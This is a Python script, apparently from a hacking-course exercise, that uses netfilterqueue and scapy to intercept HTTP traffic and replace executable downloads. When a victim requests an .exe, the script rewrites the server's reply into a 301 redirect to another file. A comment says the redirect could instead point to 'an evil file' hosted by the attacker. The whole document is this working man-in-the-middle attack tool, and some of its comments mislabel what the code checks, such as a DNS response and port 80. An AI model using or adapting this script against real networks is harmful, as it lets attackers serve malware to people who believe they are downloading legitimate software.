#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

# instead of using a link we can start an apache server and redirect the load to be an evil file in our computer

# creating this list outside the function process_packet so its not created every time, instead only once
ack_list = []


def set_load(packet, load):
    packet[scapy.Raw].load = load
    # every time you modify a packet you need to delete the following fields because
    # their tracking number will change and needs to be recalculated,
    # so by deleting them scapy will recalculate them for us
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    # checking if the packet contains a DNS response
    if scapy_packet.haslayer(scapy.Raw):
        # if port in dport field is http/80 then the packet is a request
        if scapy_packet[scapy.TCP].dport == 8080:
            if b".exe" in scapy_packet[scapy.Raw].load and b"www.rarlab.com" not in scapy_packet[scapy.Raw].load:
                # Were going to modify the response and not the request because
                # if we want to modify the request we will have to manually perform a TCP handshake

                # ach field of request = seq field of its response
                print("[+] EXE Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)

        # if port in sport field is http/80 then the packet is a response
        elif scapy_packet[scapy.TCP].sport == 8080:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/winrar-x64-611ar.exe\n\n")
                # The 301 is a response to redirect replacing the 200 ok normal response
                # Allowing us to modify the download
                packet.set_payload(str(modified_packet))
    packet.accept()


# Creating an instance of a netfilterqueue object and placing it in variable called queue
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

